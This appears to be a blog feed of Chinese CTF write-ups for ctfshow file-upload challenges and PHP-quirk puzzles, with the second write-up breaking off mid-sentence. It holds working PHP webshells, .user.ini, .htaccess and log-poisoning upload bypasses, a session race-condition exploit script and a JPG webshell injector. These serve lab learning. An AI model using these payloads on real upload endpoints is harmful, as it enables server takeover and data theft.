        <content type="html"><![CDATA[<h1 id="web151、web152"><a href="#web151、web152" class="headerlink" title="web151、web152"></a>web151、web152</h1><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>根据提示，检验写在了前端。</p><pre class="language-php" data-language="php"><code class="language-php">layui.use(&#39;upload&#39;, function()&#123;  var upload &#x3D; layui.upload;     &#x2F;&#x2F;执行实例  var uploadInst &#x3D; upload.render(&#123;    elem: &#39;#upload&#39; &#x2F;&#x2F;绑定元素    ,url: &#39;&#x2F;upload&#x2F;&#39; &#x2F;&#x2F;上传接口    ,done: function(res)&#123;    if(res.code&#x3D;&#x3D;0)&#123;    $(&quot;#result&quot;).html(&quot;文件上传成功，路径：&quot;+res.msg);    &#125;else&#123;    $(&quot;#result&quot;).html(&quot;文件上传失败，失败原因：&quot;+res.msg);    &#125;          &#125;    ,error: function()&#123;      $(&quot;#result&quot;).html(&quot;文件上传失败&quot;);    &#125;  &#125;);&#125;);</code></pre><p>检测写在前端了，写入php一句话木马，修改后缀为png。上传并抓包。修改文件后缀为需要的php后缀，并访问所需目录：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402955857-f686aac1-0654-4ed7-917d-cfca7ddd6fce.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402971003-055c2997-e4ed-4ed8-9305-7289cd1bee30.png" alt="image.png"><br>payload：GET：<code>?1=system(&#39;tac ../flag.php&#39;);</code></p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><blockquote><p><a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">https://www.dazhuanlan.com/vip_mmles&#x2F;topics&#x2F;1547397</a> userini</p></blockquote><h3 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h3><p>whatweb指纹识别，发现是nginx，而且在upload页面下发现index.php文件。而且很容易上传如php5,phtml等类型文件，但是不解析，需要上传.user.ini，使文件解析。<br>.user.ini里面可以写：让所有文件都包含该文件</p><pre class="language-php" data-language="php"><code class="language-php">auto_prepend_file &#x3D; 1.txt</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688404601489-6ec09a2c-4a79-4083-b328-5d72e5cb6763.png" alt="image.png"><br>然后再上传图片马或者直接上传一句话木马文本即可。<br>上传1.txt内容为：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php ($_GET[1])($_GET[2]);</code></pre><p>然后访问upload&#x2F;index.php并传入payload即可：<br><code>upload/index.php?1=system&amp;2=tac ../fla*</code></p><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>同153上传.user.ini 然后上传图片马。<br>在前面一题的基础上增加了内容过滤,过滤了php , 可以用大小写来绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405318328-4eb99034-670a-4fe6-ac18-e23af1e2451d.png" alt="image.png"><br>payload同上题目即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405482171-89b0dee7-b7a0-4359-b477-396cfe446689.png" alt="image.png"></p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>上传彻底禁用了php 大小写都不行。<br>还是先上传.user.ini 然后使用短标签，建议使用&lt;?&#x3D;短标签即可<br>短标签：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;? echo &#39;123&#39;;?&gt; &#x2F;&#x2F;short_open_tags&#x3D;on&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt; &#x2F;&#x2F;无限制&lt;% echo &#39;123&#39;;%&gt; &#x2F;&#x2F;asp_tags&#x3D;on php_version &lt; 7&lt;script language&#x3D;”php”&gt;echo &#39;123&#39;; &lt;&#x2F;script&gt; &#x2F;&#x2F;php_vsesion &lt; 7</code></pre><p>1.png：<code>&lt;?=system($_GET[1]);</code><br>payload:<code>upload/index.php?1=phpinfo&amp;2=tac ../f*</code></p><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>经过测试过滤了[ ,可以用{}代替[],其它的步骤和前面几个一致<br>1.png : <code>&lt;?=system($_GET&#123;1&#125;);</code></p><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>又过滤了;和{<br>1.png <code>&lt;?=(system(&#39;nl ../*.ph*&#39;))?&gt;</code><br>注意使用方式可以省略分号，</p><h1 id="web158、web159"><a href="#web158、web159" class="headerlink" title="web158、web159"></a>web158、web159</h1><p>1.png <code>&lt;?=</code>tac ..&#x2F;f*<code>?&gt;</code></p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>这题将空格和&#96;&#96;反引号和log过滤掉了，所以上传的时候要注意略过多余的空格，log可以用点号拼接绕过，且本题不能使用上题的方法。<br>nginx的日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log里</p><p>注意这次的.user.ini文件内容是：<br><code>auto_prepend_file=1.png</code>需要将等号两端空格删除<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688446683068-0bcfe710-e681-4a91-aa17-840a2c552880.png" alt="image.png">1.png <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>按照wp这种写法 会发现提示格式错误。<br>经过查询资料发现，正确的写法应该是：<br>将include和地址中间加一个换行。<br>先用1标记一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447711896-937e1a62-fa1a-4d66-a9f2-ae783d511c8a.png" alt="image.png"><br>切换到hex部分<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447786035-2cd193c2-79dd-437c-955c-bf878c13b927.png" alt="image.png"><br>将1改为0d即可上传成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447819911-82544bdd-ea96-40a4-93d5-39096e9badf1.png" alt="image.png"><br>直接访问即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688448270283-a83e5567-2d1c-4f82-9ee1-50e690b068d3.png" alt="image.png"> </p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h3 id="图片头"><a href="#图片头" class="headerlink" title="图片头"></a>图片头</h3><p>加上图片头：</p><pre class="language-php" data-language="php"><code class="language-php">GIF89A</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480295049-d3bc1e6b-07ae-4e94-99d2-a3445fcc1b94.png" alt="image.png"><br>图片马同理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480375207-109baf2b-5e1b-47b9-93ae-a86cc031df77.png" alt="image.png"><br>UA传入一句话木马。</p><h1 id="web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）"><a href="#web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）" class="headerlink" title="web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）"></a>web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）</h1><p>过滤了<code>.</code>，所以不能利用日志包含了，先正常上传.user.ini<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481049862-c54f9e2a-74b3-40c2-a695-f853daba81d5.png" alt="image.png"></p><h2 id="方法一-远程文件包含"><a href="#方法一-远程文件包含" class="headerlink" title="方法一 远程文件包含"></a>方法一 远程文件包含</h2><p>因为不能有.所以将IP转换为十进制，然后修改默认为一句话木马。也就是：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481931827-fd1cc178-4590-4fa9-a4a5-c2f8c1e80c9d.png" alt="image.png"><br>这里由于需要修改默认页面过于麻烦，这里就没有复现。</p><h2 id="方法二-session条件竞争"><a href="#方法二-session条件竞争" class="headerlink" title="方法二 session条件竞争"></a>方法二 session条件竞争</h2><p>利用session.upload_progress将木马写入session文件，然后包含这个session文件。<br>首先在.user.ini包含&#x2F;tmp&#x2F;sess_test</p><pre class="language-php" data-language="php"><code class="language-php"># -*- coding: utf-8 -*-# @Time : 20.12.5 13:52# @author:lonmarimport ioimport requestsimport threadingsessid &#x3D; &#39;test&#39;data &#x3D; &#123;    &quot;ctf&quot;: &quot;&#x2F;tmp&#x2F;sess_test&quot;,    &quot;cmd&quot;: &#39;system(&quot;tac ..&#x2F;f*&quot;);&#39;&#125;def write(session):    while event.isSet():        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)        resp &#x3D; session.post(&#39;http:&#x2F;&#x2F;73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show&#x2F;&#39;,                            data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;&#125;,                            files&#x3D;&#123;&#39;file&#39;: (&#39;test.txt&#39;, f)&#125;, cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessid&#125;)def read(session):    while event.isSet():        res &#x3D; session.post(            &#39;http:&#x2F;&#x2F;73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show&#x2F;&#39;,            data&#x3D;data        )        if &#39;ctfshow&#123;&#39; in res.text:            print(res.text)            event.clear()        else:            print(&#39;[*]retrying...&#39;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    event &#x3D; threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 5):            threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()        for i in range(1, 5):            threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()</code></pre><p>但是不知道为什么一直也竞争不到。<br>应该是线程的原因，他这个竞争条件只有后半夜才开放。这里就不复现了。</p><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>使用生成图片马：<br><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a><br>使用命令：</p><pre class="language-php" data-language="php"><code class="language-php">python generate.py -m php -o 1.png</code></pre><p>生成的图片文本内容会出现：<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code><br>对应传值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688889962772-0ebf85cd-590f-41dc-88d7-5d5554df2bf9.png" alt="image.png"><br>下载图片，以文本的格式打开就会发现内容。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890006709-fa1d6252-3631-4a0a-bd11-062d0f875536.png" alt="image.png"></p><h1 id="web165（傻逼库一直导不进去）"><a href="#web165（傻逼库一直导不进去）" class="headerlink" title="web165（傻逼库一直导不进去）"></a>web165（傻逼库一直导不进去）</h1><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>这次图片上传之后会被二次渲染。<br>可以先将图片渲染一张，然后再写入木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890383585-00cf1a9c-19b5-4f12-bafc-08a45e71214b.png" alt="image.png"><br>二次渲染之后写入木马：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().It is necessary that the size and quality of the initial image are the same as those of the processed image.1) Upload an arbitrary image via secured files upload script2) Save the processed image and launch:jpg_payload.php &lt;jpg_name.jpg&gt;In case of successful injection you will get a specially crafted image, which should be uploaded again.Since the most straightforward injection method is used, the following problems can occur:1) After the second processing the injected data may become partially corrupted.2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.Sergey Bobrov @Black2Fan.See also:https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;*&#x2F;$miniPayload &#x3D; &quot;&lt;?&#x3D;eval(\$_POST[7]);?&gt;&quot;; &#x2F;&#x2F;注意$转义if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;    die(&#39;php-gd is not installed&#39;);&#125;if(!isset($argv[1])) &#123;    die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);&#125;set_error_handler(&quot;custom_error_handler&quot;);for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;    $nullbytePayloadSize &#x3D; $pad;    $dis &#x3D; new DataInputStream($argv[1]);    $outStream &#x3D; file_get_contents($argv[1]);    $extraBytes &#x3D; 0;    $correctImage &#x3D; TRUE;    if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;        die(&#39;Incorrect SOI marker&#39;);    &#125;    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;        $marker &#x3D; $dis-&gt;readByte();        $size &#x3D; $dis-&gt;readShort() - 2;        $dis-&gt;skip($size);        if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;            $startPos &#x3D; $dis-&gt;seek();            $outStreamTmp &#x3D;                substr($outStream, 0, $startPos) .                $miniPayload .                str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                substr($outStream, $startPos);            checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);            if($extraBytes !&#x3D;&#x3D; 0) &#123;                while((!$dis-&gt;eof())) &#123;                    if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;                        if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;                            break;                        &#125;                    &#125;                &#125;                $stopPos &#x3D; $dis-&gt;seek() - 2;                $imageStreamSize &#x3D; $stopPos - $startPos;                $outStream &#x3D;                    substr($outStream, 0, $startPos) .                    $miniPayload .                    substr(                        str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                        substr($outStream, $startPos, $imageStreamSize),                        0,                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                    substr($outStream, $stopPos);            &#125; elseif($correctImage) &#123;                $outStream &#x3D; $outStreamTmp;            &#125; else &#123;                break;            &#125;            if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                die(&#39;Success!&#39;);            &#125; else &#123;                break;            &#125;        &#125;    &#125;&#125;unlink(&#39;payload_&#39;.$argv[1]);die(&#39;Something\&#39;s wrong&#39;);function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;    global $correctImage;    file_put_contents($filename, $data);    $correctImage &#x3D; TRUE;    imagecreatefromjpeg($filename);    if($unlink)        unlink($filename);    return $correctImage;&#125;function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;    global $extraBytes, $correctImage;    $correctImage &#x3D; FALSE;    if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;        if(isset($m[1])) &#123;            $extraBytes &#x3D; (int)$m[1];        &#125;    &#125;&#125;class DataInputStream &#123;    private $binData;    private $order;    private $size;    public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;        $this-&gt;binData &#x3D; &#39;&#39;;        $this-&gt;order &#x3D; $order;        if(!$fromString) &#123;            if(!file_exists($filename) || !is_file($filename))                die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);            $this-&gt;binData &#x3D; file_get_contents($filename);        &#125; else &#123;            $this-&gt;binData &#x3D; $filename;        &#125;        $this-&gt;size &#x3D; strlen($this-&gt;binData);    &#125;    public function seek() &#123;        return ($this-&gt;size - strlen($this-&gt;binData));    &#125;    public function skip($skip) &#123;        $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);    &#125;    public function readByte() &#123;        if($this-&gt;eof()) &#123;            die(&#39;End Of File&#39;);        &#125;        $byte &#x3D; substr($this-&gt;binData, 0, 1);        $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);        return ord($byte);    &#125;    public function readShort() &#123;        if(strlen($this-&gt;binData) &lt; 2) &#123;            die(&#39;End Of File&#39;);        &#125;        $short &#x3D; substr($this-&gt;binData, 0, 2);        $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);        if($this-&gt;order) &#123;            $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);        &#125; else &#123;            $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);        &#125;        return $short;    &#125;    public function eof() &#123;        return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);    &#125;&#125;?&gt;</code></pre><p>注意使用之前要导入php的gd库<br>然后注入即可，但是这里我的库没导入明白。所以尝试一下对比渲染前后两个文件。发现内容有部分不会改变，可以在不变处注入木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688892427399-bbc837a0-d38d-4ca2-beea-d9b59d3feb7b.png" alt="image.png"><br>试了一下 似乎不太行。<br>太重量级了 ，一直提示下不下来gd扩展。<br>气麻了。不做了。</p><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>检测是否为zip，穿一个zip然后直接在bp里面抓包即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899018551-9b58895b-38e1-4f92-831e-1d312225a70d.png" alt="image.png"></p><h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>使用<code>.htaccess</code>的一个要求就是使用apache<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899252427-86a535b8-9d71-4995-9c36-56b8e1ecd69e.png" alt="image.png"><br>htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><pre class="language-php" data-language="php"><code class="language-php">AddType application&#x2F;x-httpd-php .jpg   &#x2F;&#x2F;将.png后缀的文件解析 成php</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899639889-8d65e30b-7273-496a-82fd-4e5af74b68a3.png" alt="image.png"><br>再传一个jpg为后缀的一句话木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899700671-4d857077-8ad6-4548-bc54-25ea14f1c8c6.png" alt="image.png"></p><h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h3 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h3><p>过滤了关键字eval system<br>就简单用</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900322936-79959956-1bac-4480-9a63-9177fc0a01a7.png" alt="image.png"><br>上传之后访问即可。但是注意，点击下载之后跳转链接是错误的。正确的连接<code>/upload/jichumiansha.php</code><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900506632-4a8dd9e3-991c-4233-af39-1da09d8574f0.png" alt="image.png"></p><h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h3 id="日志包含-1"><a href="#日志包含-1" class="headerlink" title="日志包含"></a>日志包含</h3><p>还是之前的.user.ini。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900849727-63a7d2c3-edd5-40e0-a16d-129958b252d1.png" alt="20210423141358274.png"><br>contenttype要修改成如图的样式。<br>然后再传一个php文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901084652-94e75a15-5c22-4c8a-bafa-86907f8ffa0d.png" alt="image.png"><br>注意图中UA，文件名，文件种类。<br>然后就是访问1.php了。<br><code>upload/1.php?2=tac ../f*</code></p><h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><h3 id="user-ini-GIF89A文件头"><a href="#user-ini-GIF89A文件头" class="headerlink" title=".user.ini GIF89A文件头"></a>.user.ini GIF89A文件头</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901395850-cfc84364-443e-406e-bd88-c2c5572653f1.png" alt="image.png"><br>加个文件头即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web106-web131php特性篇（二）</title>
      <link href="/posts/8b1fb998/"/>
      <url>/posts/8b1fb998/</url>
      
        <content type="html"><![CDATA[<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;  $v1 &#x3D; $_POST[&#39;v1&#39;];  $v2 &#x3D; $_GET[&#39;v2&#39;];  if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;    echo $flag;  &#125;&#125;</code></pre><p>数组和转为0e都行，这里图省事使用了数组绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334208070-bcca58a3-83a4-4cb2-a742-02362c1d614a.png" alt="image.png"></p><h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107 parse_str"></a>web107 parse_str</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]))&#123;  $v1 &#x3D; $_POST[&#39;v1&#39;];  $v3 &#x3D; $_GET[&#39;v3&#39;];  parse_str($v1,$v2);  if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;    echo $flag;  &#125;&#125;</code></pre><p><code>parse_str</code>函数会存储值作为变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334510177-e84f6494-6118-48b2-8afe-2446165f306e.png" alt="image.png"><br>因此题目的意思是将v1中flag值与v3中的MD5值相同，那么：<br>GET：<code>?v3=hello</code><br>POST：<code>v1=flag=5d41402abc4b2a76b9719d911017c592</code></p><h1 id="web108-ereg-null绕过和intval"><a href="#web108-ereg-null绕过和intval" class="headerlink" title="web108 ereg null绕过和intval"></a>web108 ereg null绕过和intval</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;    die(&#39;error&#39;);&#125;&#x2F;&#x2F;只有36d的人才能看到flagif(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;    echo $flag;&#125;</code></pre><p><code>ereg</code>匹配函数，题目意思为c中只能出现字符，函数在NULL截断漏洞，%00截断绕过<br><code>strrev</code>反转字符串<br>0x36d对应的数值为877，需要反转一次变为778。<br>组合起来payload：<code>a%00778</code></p><h1 id="web109-异常处理类命令执行"><a href="#web109-异常处理类命令执行" class="headerlink" title="web109 异常处理类命令执行"></a>web109 异常处理类命令执行</h1><blockquote><p>异常处理类：<a href="http://c.biancheng.net/view/6253.html">h<del>ttp:&#x2F;&#x2F;c.biancheng.net&#x2F;view&#x2F;6253.html</del></a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125;</code></pre><p>直接构造反射类（并没有想到，反射类还是没有太弄懂）<br><code>?v1=ReflectionClass&amp;v2=system(&quot;tac f*&quot;)</code><br>也可以用exception类，详情见题目下方链接。<br>Exception 异常处理类  payload: <code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>同理：<code>?v1=mysqli&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code><br>这些都是因为类的tostring魔术方法导致的执行。<br>也就是初始化一个mysqli类，但是实际上这个类的初始化时候传参不止这一个，所以是初始化失败的，但是由于其内部有魔术方法__toString：<br>如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。<br>这时候就可以echo出来了。<br>同样内部类Exception也是可以的，这个类会把传入的参数输出出来，也是由__toString方法。</p><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><p>反射类详情见web100方法二</p><h1 id="web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件"><a href="#web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件" class="headerlink" title="web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件"></a>web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</h1><blockquote><p><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;</code></pre><p>利用 FilesystemIterator 获取指定目录下的所有文件 <a href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a> <a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> getcwd()函数 获取当前工作目录 返回当前工作目录<br>payload：<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h1 id="web111-引用变量和-GLOBALS-指针相关"><a href="#web111-引用变量和-GLOBALS-指针相关" class="headerlink" title="web111 引用变量和$GLOBALS 指针相关"></a>web111 引用变量和$GLOBALS 指针相关</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;</code></pre><p>想要执行getflag函数，那么v1必须为<code>ctfshow</code>，v2赋值为<code>GLOBALS</code>，这里运用到了全局变量。<br>然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag<br>实在没看懂，我们看看以下解释：<br>假设现在有以下两个变量：</p><pre class="language-php" data-language="php"><code class="language-php">$v1 &#x3D; &#39;foo&#39;;  &#x2F;&#x2F; $v1 的值为字符串 &#39;foo&#39;$v2 &#x3D; &#39;bar&#39;;  &#x2F;&#x2F; $v2 的值为字符串 &#39;bar&#39;$bar &#x3D; &#39;i am bar&#39;;</code></pre><p>现在调用 <code>getFlag</code> 函数，并将 <code>$v1</code> 和 <code>$v2</code> 作为引用参数传递给它：</p><pre class="language-php" data-language="php"><code class="language-php">getFlag($v1, $v2);</code></pre><p>在函数内部，<code>&quot;$$v1 = &amp;$$v2;&quot;</code> 这一行代码将把 <code>$v2</code> 的引用赋值给了以 <code>$v1</code> 变量的值 <code>&#39;foo&#39;</code> 作为变量名的新变量。也就是说，在函数执行完毕后，我们得到了另一个变量 <code>$foo</code>，它指向了和 <code>$bar</code> 相同的内存地址。<br>因此，如果我们在调用 <code>getFlag</code> 